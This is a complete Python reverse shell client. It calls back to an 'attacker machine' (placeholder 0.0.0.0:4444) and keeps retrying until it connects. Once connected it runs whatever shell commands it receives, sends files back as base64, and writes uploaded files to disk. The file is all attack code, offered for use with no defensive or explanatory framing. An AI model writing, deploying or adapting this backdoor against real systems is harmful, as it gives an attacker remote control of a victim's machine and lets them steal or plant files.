import socket
import json
import os
import base64
import subprocess
import time

class ReverseShellClient:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    def connect(self):
        while True:
            try:
                self.connection.connect((self.host, self.port))
                print(f"[+] Connected to {self.host}:{self.port}")
                self.listen()
            except Exception as e:
                print(f"[-] Connection failed, retrying in 5 seconds...")
                time.sleep(5)
    
    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())
    
    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue
    
    def execute_system_command(self, command):
        try:
            if command[0] == "cd" and len(command) > 1:
                os.chdir(command[1])
                return "[+] Changed directory to " + os.getcwd()
            else:
                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                return result.decode()
        except Exception as e:
            return f"[-] Error: {str(e)}"
    
    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()
    
    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful"
    
    def listen(self):
        while True:
            try:
                command = self.reliable_receive()
                
                if command[0] == "exit":
                    self.connection.close()
                    exit()
                elif command[0] == "download":
                    result = self.read_file(command[1])
                elif command[0] == "upload":
                    result = self.write_file(command[1], command[2])
                else:
                    result = self.execute_system_command(command)
                
                self.reliable_send(result)
            except Exception as e:
                self.reliable_send(f"[-] Error: {str(e)}")

if __name__ == "__main__":
    # Replace with your attacker machine's IP
    HOST = "0.0.0.0"  
    PORT = 4444
    
    client = ReverseShellClient(HOST, PORT)
    client.connect()
